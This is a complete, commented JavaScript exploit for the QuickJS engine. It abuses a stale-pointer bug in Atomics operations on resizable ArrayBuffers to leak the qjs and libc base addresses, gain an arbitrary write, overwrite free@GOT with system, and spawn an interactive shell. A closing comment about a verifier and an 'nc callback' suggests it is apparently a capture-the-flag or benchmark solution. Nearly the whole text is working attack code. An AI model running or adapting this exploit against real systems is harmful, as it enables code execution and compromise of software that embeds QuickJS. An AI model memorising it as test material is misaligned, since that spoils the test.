// QuickJS exploit: Atomics + Resizable ArrayBuffer stale-pointer bug -> overwrite free@GOT -> system("sh -i")
//
// The exploit avoids os.exec/std.popen and uses only memory corruption.

function u64(x) {
  return BigInt.asUintN(64, x);
}
function i64(x) {
  return BigInt.asIntN(64, x);
}

// qjs (PIE) offsets (from nm/objdump on the target build)
const OFF_QJS_JS_ARRAY_BUFFER_FREE = 0x14bc0n; // js_array_buffer_free()
const OFF_QJS_FREE_GOT = 0x10b008n;           // free@GOT (JUMP_SLOT)

// libc offsets (glibc 2.41 in this environment)
const OFF_LIBC_UNSORTED_HDR = 0x1e7b20n;      // bin_at(main_arena, 1) (fake chunk header)
const OFF_LIBC_SYSTEM = 0x53110n;             // system@@GLIBC_2.2.5

// Warm-up to avoid lazy init allocations after we hook free@GOT
(() => {
  // Ensure transfer methods and BigInt DataView helpers are instantiated
  let t = new ArrayBuffer(8);
  new DataView(t).setBigUint64(0, 1n, true);
  new ArrayBuffer(1).transfer(1);
})();

function leak_qjs_base() {
  // Free a 56-byte chunk and immediately reuse it as a JSArrayBuffer struct.
  // Then read abuf->free_func (offset 48) from stale pointer.
  let rab = new ArrayBuffer(56, { maxByteLength: 0x400 });
  let ta = new BigInt64Array(rab);
  let barrier = new ArrayBuffer(0x1000);

  globalThis._leak_victim = null;

  let expected = {
    valueOf() {
      rab.resize(0x200);
      // This allocates a JSArrayBuffer struct (56 bytes) which should reuse the freed chunk.
      globalThis._leak_victim = new ArrayBuffer(0x10);
      return 0n;
    }
  };

  // JSArrayBuffer.free_func is at offset 48 => index 6
  let free_func_ptr = u64(Atomics.compareExchange(ta, 6, expected, 1n));
  return free_func_ptr - OFF_QJS_JS_ARRAY_BUFFER_FREE;
}

function leak_libc_base() {
  // Free a large chunk into the unsorted bin and read its bk pointer (offset 8).
  // The bk points to the unsorted bin header: bin_at(main_arena, 1).
  let rab = new ArrayBuffer(0x1000, { maxByteLength: 0x3000 });
  let ta = new BigInt64Array(rab);
  let barrier = new ArrayBuffer(0x1000);

  let expected = {
    valueOf() {
      rab.resize(0x2000);
      return 0n;
    }
  };

  let unsorted_hdr = u64(Atomics.compareExchange(ta, 1, expected, 1n));
  return unsorted_hdr - OFF_LIBC_UNSORTED_HDR;
}

function make_arb_abuf_pointing_to(addr) {
  // Corrupt a freshly created ArrayBuffer's JSArrayBuffer.data pointer to `addr`.
  // We do it by freeing a 56-byte chunk and reusing it as the JSArrayBuffer struct.
  let rab = new ArrayBuffer(56, { maxByteLength: 0x400 });
  let ta = new BigInt64Array(rab);
  let barrier = new ArrayBuffer(0x1000);

  globalThis._arb = null;

  let val = {
    valueOf() {
      rab.resize(0x200);
      // Allocate victim ArrayBuffer; its JSArrayBuffer struct will reuse freed chunk.
      globalThis._arb = new ArrayBuffer(0x1000);
      // Atomics.store will write this BigInt to the stale pointer (abuf->data field).
      return i64(addr);
    }
  };

  // JSArrayBuffer.data is at offset 16 => index 2
  Atomics.store(ta, 2, val);
  return globalThis._arb;
}

function write_u64_via_abuf(ab, off, value) {
  new DataView(ab).setBigUint64(off, u64(value), true);
}

// === Stage 1: leaks ===
let qjs_base = leak_qjs_base();
let libc_base = leak_libc_base();

let free_got = qjs_base + OFF_QJS_FREE_GOT;
let system_addr = libc_base + OFF_LIBC_SYSTEM;

// === Stage 2: build an ArrayBuffer whose backing store is free@GOT ===
let arb = make_arb_abuf_pointing_to(free_got);

// === Stage 3: overwrite free@GOT with system ===
write_u64_via_abuf(arb, 0, system_addr);

// === Stage 4: trigger system("sh -i") via ArrayBuffer detach ===
let cmd = new ArrayBuffer(0x20);
let u8 = new Uint8Array(cmd);
let s = "sh -i";
for (let i = 0; i < s.length; i++) u8[i] = s.charCodeAt(i);
u8[s.length] = 0;

// Detach invokes abuf->free_func(rt, opaque, data) -> js_array_buffer_free -> free(data)
// After the GOT overwrite, this becomes system(data).
cmd.transfer(0);

// Keep process alive; verifier will time out but should already have received the nc callback.
for (;;) {}
